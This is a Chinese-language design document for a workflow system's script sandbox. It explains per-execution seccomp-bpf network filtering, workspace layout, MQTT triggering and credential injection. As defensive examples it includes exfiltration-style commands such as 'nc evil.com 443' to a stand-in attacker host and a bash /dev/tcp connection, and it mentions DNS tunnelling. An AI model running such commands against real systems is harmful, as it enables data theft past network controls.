# Sandbox

[系统总览](../overview_ZH.md) · [TaskManager](taskmanager_ZH.md) · [AgentFlow Sandbox Node](../agent-flow_ZH.md)

Sandbox 是独立执行 Worker，由 JobManager ResourceManager 与 TaskManager
并列管理。TaskManager 将 Script 与 Input 写入共享 Workspace；Sandbox 在隔离
Pod 内应用每次执行独立的 seccomp-bpf 规则并运行 Script；结果同时通过 MQTT
和共享结果文件返回。

```text
TaskManager ──sandbox/trigger──► SandboxSlotWorker
     │                                │
     ├──── 共享 RWX Workspace ◄───────┤
     ◄──sandbox/result + result.json──┘
                 │
       K8s Pod 隔离 + seccomp-bpf USER_NOTIF
```

## 隔离与执行模型

Sandbox 执行 Agent 或 Skill 生成的 Python、Bash、Node Script。它作为独立
微服务（`flowgent sandbox start`）运行，从 Queue 消费 Trigger，并通过共享
Workspace Volume 读写文件。

### 双持久化模型

| 类型 | 存储 | 可跨越 | 示例 |
|---|---|---|---|
| **工作数据（文件）** | Workspace Volume（PVC） | Pod 重启、集群重启 | 代码 Patch、Script、构建产物 |
| **共享记忆（Knowledge）** | Storage（SQLite/PostgreSQL） | 所有生命周期 | Agent 对话历史、Run 进度 |

### Workspace 路径约定

```text
{workspace}/{namespaceId}/{flowId}/{runId}/{taskId}/
  ├── script.{py,sh,js}
  ├── input.json
  ├── result.json
  ├── status
  └── original/   （修改前快照）
```

### 安全策略——三级覆盖

| 层级 | 配置来源 | 范围 |
|---|---|---|
| 全局 | `flowgent.yaml` → `sandbox.policy` | 所有 Sandbox 执行 |
| Flow | `AgentFlowSpec.sandbox_policy` | 一个 Flow 的全部 Node |
| Node | `Node.network_policy` | 单个 Node |

解析顺序为 Node Override > Flow Override > Global Default，见
`model.EffectiveNetworkPolicy()`。

### 网络隔离——seccomp-bpf + Userspace Notifier

**为什么不只用 iptables、Istio 或 K8s NetworkPolicy？**

Network Policy 按 Flow、按 Node 定义，而同一个 Sandbox Pod 会并发执行不同
Flow 的 Script。所有 Pod 级机制都是**静态的**，从 Pod 启动开始统一作用于 Pod
内所有进程：

| 机制 | 层级 | 可按每次执行动态变化？ | 逃逸路径 |
|---|---|---|---|
| iptables | Pod netns | 否，规则作用于全部进程 | 具有 `NET_ADMIN` 的进程可删除规则 |
| Istio/envoy Sidecar | Pod | 否，Sidecar 在创建 Pod 时注入 | 进程可删除 iptables 重定向规则 |
| K8s NetworkPolicy | Pod | 否，由 CNI 在 Pod 边界执行 | Pod 内进程已越过该边界 |
| ALL_PROXY 环境变量 | 进程 | 是，但仅为约定 | `unset ALL_PROXY; nc evil.com 443` |
| **seccomp-bpf + notifier** | **每线程** | **是，在每个 Script 前安装 Filter** | **内核强制，进程无法移除** |

**架构：**

```text
SandboxRunner（Go 进程）
  │
  ├─→ 每次执行 Script 前：
  │     1. 预解析 Allowlist Hostname → IP
  │        （例如 nexus3:8081 → 10.43.162.201:8081）
  │     2. 构造 seccomp-bpf Filter：
  │        - 阻止 socket(AF_INET, SOCK_RAW, *)       → EPERM
  │        - 阻止 bpf(), init_module(), kexec_load() → EPERM
  │        - sendto/sendmsg/sendmmsg 到 53 端口       → ALLOW（DNS）
  │        - connect/sendto/sendmsg/sendmmsg          → USER_NOTIF
  │        - 其他                                      → ALLOW
  │     3. 通过 seccomp(SECCOMP_SET_MODE_FILTER,
  │        SECCOMP_FILTER_FLAG_TSYNC) 安装 Filter
  │
  ├─→ 启动 Notifier Goroutine：
  │     - 读取 seccomp notify fd
  │     - 对每个 SECCOMP_RET_USER_NOTIF 事件：
  │       - 从 /proc/<pid>/mem 的 args[1] 读取 sockaddr
  │       - 若 (ip, port) 在 Allowlist → SECCOMP_USER_NOTIF_FLAG_CONTINUE
  │       - 否则返回 EPERM
  │
  ├─→ exec.Command("bash", scriptFile)    ← Child 继承 Filter
  │     - Script 调用 curl nexus3:8081
  │     → glibc: getaddrinfo("nexus3") → DNS 查询（UDP 53，BPF 允许）
  │     → glibc: connect(fd, {10.43.162.201, 8080})
  │     → 内核 seccomp: USER_NOTIF → Notifier 检查 IP+Port → ALLOW
  │     → Script 调用 nc evil.com 443
  │     → 内核 seccomp: USER_NOTIF → Notifier 检查 IP+Port → DENY (EPERM)
  │
  └─→ Script 退出后：
        - Child 进程死亡，Filter 自动释放，无需清理
        - Notifier Goroutine 退出
```

**Syscall 覆盖——阻断所有出口路径：**

| Syscall | 协议 | 是否拦截 | 说明 |
|---|---|---|---|
| `connect()` | TCP（及已连接 Socket 的 UDP） | 是，BPF 发送给 Notifier | curl、wget、HTTP Client 的常见路径 |
| `sendto()` | UDP（及 TCP Fast-path） | 是 | DNS 端口 53 无条件允许 |
| `sendmsg()` | Scatter-gather UDP/TCP | 是 | sendmmsg 和高级 Socket API 使用 |
| `sendmmsg()` | 批量 sendmsg | 是 | 与 sendmsg 相同检查 |
| `socket()` | 创建 Socket | 是，直接阻止 SOCK_RAW | 防止注入原始 IP Packet |
| `exec 3<>/dev/tcp/h/p` | Bash TCP 伪设备 | 是，Bash 内部调用 `connect()` | 无需特殊处理 |
| `bpf()` | BPF Syscall | 是，无条件阻止 | 防止进程安装自己的 seccomp |
| `init_module()` | 加载 Kernel Module | 是，无条件阻止 | 防止权限提升 |
| `kexec_load()` | Kernel 执行 | 是，无条件阻止 | 防止权限提升 |
| `perf_event_open()` | 性能监控 | 是，无条件阻止 | 防止侧信道攻击 |

**为什么在 BPF 层无条件允许 DNS？**

glibc 标准 DNS 解析使用 `sendto()`，Resolver 地址（如 `127.0.0.1:53` 或 Pod
DNS Server）直接位于 Syscall 参数中，没有预先 `connect()`。允许发往 53 端口的
`sendto`/`sendmsg` 使 Script 可以解析 Hostname；随后到解析所得 IP 的实际
TCP/UDP 连接仍由 Notifier 检查。

因此 Script 可以通过 DNS 查询泄露 Hostname；但实际数据外传连接会在
`connect()` 层被阻止。如果还需要防范 DNS 外传（TXT Record Tunnel，每次约
200 Byte），未来可把 DNS 端口限制到特定 Resolver IP。

**为什么不用 `SECCOMP_RET_TRAP`（SIGSYS）？** SIGSYS 会杀死进程。网络过滤
需要“允许一部分、拒绝另一部分”，USER_NOTIF 是唯一能检查参数并按调用决策且
不杀死进程的机制。

**为什么不直接用 `SECCOMP_RET_ERRNO`？** ERRNO 无法检查目标地址便立即返回，
因此无法读取 sockaddr 区分允许的 `nexus3:8081` 和拒绝的 `evil.com:443`。

**Docker 模式：** 配置 `sandbox.image` 时，Docker Container 以
`--network=none` 运行，并附加 seccomp Filter。Filter 仍安装在创建 Container
的 docker 进程上，形成纵深防御。

**Process 模式（无 Docker）：** seccomp Filter 是主要且唯一的强制机制，
通过 `exec.Cmd.SysProcAttr` 安装到 Child Process。

### Sandbox 执行模型（独立 Pod + 共享 Volume）

Sandbox 子系统跨两个 Go Module，通过 MQTT 与共享 PVC 通信：

```text
TM Pod (SandboxExecutor)                Sandbox Pod (SandboxRunner)
─────────────────────────               ─────────────────────────
  → 构造 Workspace 路径                  → $share/sandbox-pool 订阅
  → 向共享 PVC 写 Script                  → 通过 MQTT 获取 Trigger
  → 保存原始文件快照                      → 从共享 PVC 读 Script
  → 发布 Trigger ───MQTT──→             → BuildFilter(network_policy)
    Topic: .../sandbox/trigger            → 安装 seccomp (TSYNC)
    {namespace}/{flowId}/{runId}           → 启动 Notifier Goroutine
  → 订阅 Result ←──MQTT──                → 执行 bash/python3/node
    Topic: .../sandbox/result             → 等待 Child Process 退出
    {namespace}/{flowId}/{runId}           → Notifier 自动退出
  → 从 PVC 读 result.json                 → 写 result.json + status 到 PVC
                                           → 发布 Result ───MQTT──→
```

分布式模式的 Sandbox Pod 通过 `$share/sandbox-pool` 共享订阅负载均衡消费
Trigger。Trigger Topic 包含 `{namespace}/{flowId}/{runId}`，多个 Run 不会
互相干扰。Result 使用相同后缀点对点路由，只有来源 TM Slot 订阅。

`SandboxTrigger` Struct 定义在 `model`，使双方共享契约而不产生 Go Import
耦合。Sandbox K8s Deployment 由 JM 的 K8sRM 创建并扩缩，与 TM Pod 使用
相同的 Goroutine 模式。

```text
Sandbox Worker（Sandbox Pod 内，每次执行的生命周期）：
  → 从 $share/sandbox-pool 取 Trigger
  → 从共享 Workspace PVC 读取 Script
  → 预解析 Allowlist Host → IP
  → 根据解析 IP 与端口列表构造 seccomp-bpf Filter
  → 安装 Filter（SECCOMP_FILTER_FLAG_TSYNC）
  → 启动 Notifier Goroutine（读取 seccomp notify fd）
  → 执行 bash/python3/node script.sh
  → 等待 Child Process 退出
  → Notifier 自动退出（Filter 随 Child 消亡）
  → 将 result.json + status 写入共享 PVC
  → 向 MQTT 发布结果：flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/sandbox/result
```

### Workspace——统一 PVC 设计

分布式运行时使用一个 **ReadWriteMany PVC** 作为 Sandbox Workspace；只配置
一次，由 namespace/pool 范围 Sandbox Pod 共享。

```text
/var/flowgent/
├── {namespaceId}/
│   └── {flowId}/
│       └── {runId}/
│           └── {taskId}/
│               ├── script.sh           ← SandboxExecutor 写入
│               ├── input.json          ← SandboxExecutor 写入
│               ├── result.json         ← SandboxRunner 写入
│               ├── status
│               └── original/
```

| 模式 | Workspace 路径 | Provisioning |
|---|---|---|
| Session | `/var/flowgent/{namespaceId}/{flowId}/{runId}/{taskId}/` | PVC/hostPath（Helm 预创建 Mount Source） |
| Application | 同上 | PVC/hostPath（相同路径约定） |
| All-in-one | `os.TempDir()` | 进程本地 |

两种分布式模式路径约定相同；Namespace 和 Flow 通过子目录隔离，而非独立 Volume。

### Credential 注入

外部服务 Credential 通过 `runtime.credential_env_secret` 指定的 K8s Secret
注入 JM/TM/Sandbox Pod。执行 Script 时，Sandbox Child Process 继承 Pod 环境：

```yaml
# flowgent.yaml
runtime:
  credential_env_secret: flowgent-runtime-env
```

```bash
# 每个集群创建一次 Secret
kubectl create secret generic flowgent-runtime-env \
  --from-literal=GITHUB_TOKEN=... \
  --from-literal=SONARQUBE_TOKEN=...
```

Sandbox Runner 将全部环境变量传给 Child：

```go
cmd.Env = append(os.Environ(), "HOME=/tmp", "SANDBOX_MODE=1")
```

Script 直接从环境读取 Credential：

```bash
curl -u "${NEXUS3_USER}:${NEXUS3_PASSWORD}" "$NEXUS3_URL/..."
```

Secret 不得出现在 Flow YAML 或 Workspace 文件中。

### CLI

```bash
# 以独立进程启动 Sandbox
./bin/flowgent-sandbox -c etc/flowgent.yaml

# 或作为 all-in-one 的内嵌 Runner 启动，无独立进程
./bin/flowgent -c etc/flowgent.yaml
```

---

## 预期行为

1. **给定** Sandbox ExecutionPlan，**当** TaskManager 分发时，**则** Script、Input、Status 与 Result 路径 **MUST** 全部位于该 Run/Task 的 Workspace 层级内。
2. **给定** Allowlist 或 Denylist，**当** Script 尝试访问网络时，**则** seccomp User Notification **MUST** 执行该 Node 的有效策略，并且 **MUST** 始终阻止 Raw Socket。
3. **给定**通过 Proxy 的请求，**当** `connect()` 目标是 Proxy 时，**则 MUST** 根据真实 Proxy Endpoint 授权，而不是只检查 HTTP 目标 Hostname。
4. **给定**执行成功，**当** stdout 含 JSON 时，**则**解析后的字段 **MUST** 可作为语义 Node 输出，同时 stdout/stderr 与 Exit Status **MUST** 保持可观测。
5. **给定**非零退出、策略拒绝、超时、Notifier FD 缺失或结果发布失败，**当**执行结束时，**则** Task **MUST** 失败，**MUST NOT** 报告成功。
6. **给定**多个 Sandbox Pod，**当**发布 Trigger 时，**则 MUST** 只有一个共享订阅 Slot 执行，并且关联 TaskManager **MUST** 收到唯一权威完成结果。
